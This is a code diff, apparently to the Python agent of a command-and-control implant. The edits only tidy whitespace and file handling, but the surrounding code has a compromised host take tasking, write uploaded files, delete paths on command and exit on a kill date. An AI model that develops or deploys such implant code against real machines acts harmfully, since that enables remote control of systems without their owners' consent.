@@ -227,7 +227,7 @@ def process_tasking(data):
                 resultPackets += result
 
             packetOffset += 12 + length
-        
+
         # send_message() is patched in from the listener module
         send_message(resultPackets)
 
@@ -346,9 +346,8 @@ def process_packet(packetType, data, resultID):
             if not dec_data['crc32_check']:
                 send_message(build_response_packet(0, "[!] WARNING: File upload failed crc32 check during decompressing!.", resultID))
                 send_message(build_response_packet(0, "[!] HEADER: Start crc32: %s -- Received crc32: %s -- Crc32 pass: %s!." %(dec_data['header_crc32'],dec_data['dec_crc32'],dec_data['crc32_check']), resultID))
-            f = open(filePath, 'ab')
-            f.write(dec_data['data'])
-            f.close()
+            with open(filePath, 'ab') as f:
+                f.write(dec_data['data'])
 
             send_message(build_response_packet(42, "[*] Upload of %s successful" %(filePath), resultID))
         except Exception as e:
@@ -981,7 +980,7 @@ def run_command(command, cmdargs=None):
     elif re.compile("rm").match(command):
         if cmdargs == None:
             return "please provide a file or directory"
-        
+
         if os.path.exists(cmdargs):
             if os.path.isfile(cmdargs):
                 os.remove(cmdargs)
@@ -1097,7 +1096,7 @@ while(True):
                 killDateTime = datetime.datetime.strptime(killDate, "%m/%d/%Y").date()
             except:
                 pass
-            
+
             if now >= killDateTime:
                 msg = "[!] Agent %s exiting" %(sessionID)
                 send_message(build_response_packet(2, msg))
